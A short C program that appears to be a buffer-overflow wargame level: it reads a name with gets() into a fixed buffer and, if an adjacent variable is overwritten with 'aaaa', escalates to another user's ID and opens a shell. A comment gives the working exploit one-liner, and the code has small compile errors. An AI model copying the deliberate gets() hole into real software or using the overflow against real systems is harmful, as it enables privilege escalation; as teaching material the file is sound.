#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61616161
#define G "\033[32m"
#define Y "\033[33m"
#define E "\033[0m"

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION OFF
// EXPLOIT $ (python -c "print 'x'*140+'aaaa'";cat) | ./bof1

void vuln() {
    int innocent;
    char buf[BUF_SIZE];

    puts(G "enter your name :)" E);
    gets(buf);
    printf("Hello " Y "%s" E "!\n", buf);

    if (innocent  == KEY) {
        if (setreuid(UID_BOF2, UID_BOF2)) {
            perror("setuid");
            return 1;
        }
        if (setregid(UID_BOF2, UID_BOF2)) {
            perror("setgid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(){
    vuln();
    return 0;
}
